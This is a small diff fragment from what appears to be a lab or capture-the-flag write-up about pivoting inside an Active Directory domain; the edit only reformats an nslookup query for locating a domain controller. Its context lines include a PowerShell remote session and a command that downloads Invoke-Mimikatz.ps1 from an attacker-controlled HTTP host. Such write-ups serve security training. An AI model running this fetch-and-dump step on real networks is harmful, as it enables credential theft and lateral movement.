@@ -53,7 +53,7 @@ Enter-PSSession seclogs.research.SECURITY.local
 # 4. flag:
 
 Let’s pivot to the domain controller (prod.research.security.local)—identified via the output of:
-nslookup -type=srv _ldap._tcp.dc._msdcs.research.security.local.
+`nslookup -type=srv _ldap._tcp.dc._msdcs.research.security.local`
 
 ```
 Invoke-WebRequest -Uri "http://10.0.5.101:8080/Invoke-Mimikatz.ps1" -Outfile mimi.ps1
